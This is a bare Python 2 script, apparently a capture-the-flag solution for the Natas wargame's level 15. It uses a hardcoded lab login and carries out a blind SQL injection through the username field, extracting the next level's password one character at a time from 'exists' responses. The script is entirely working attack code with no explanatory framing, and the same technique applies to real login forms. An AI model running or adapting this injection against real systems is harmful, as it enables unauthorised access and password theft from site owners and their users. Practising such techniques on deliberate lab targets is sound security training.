import requests
import base64
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
exists_char = ''
passwd = ''
auth = 'Basic ' + base64.b64encode('natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
for c in chars:
	Data = {'username':'natas16" and password like binary "%'+ c +'%'}
	r = requests.post("http://natas15.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
	if "exists" in r.text:
		exists_char += c
		print "Exists: " + exists_char
		
for i in range(0,32):
	for k in exists_char:
		Data = {'username':'natas16" and password like binary "'+passwd + k +'%'}
		r = requests.post("http://natas15.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
		if "exists" in r.text:
			passwd += k
			print "Password: " + passwd
			break
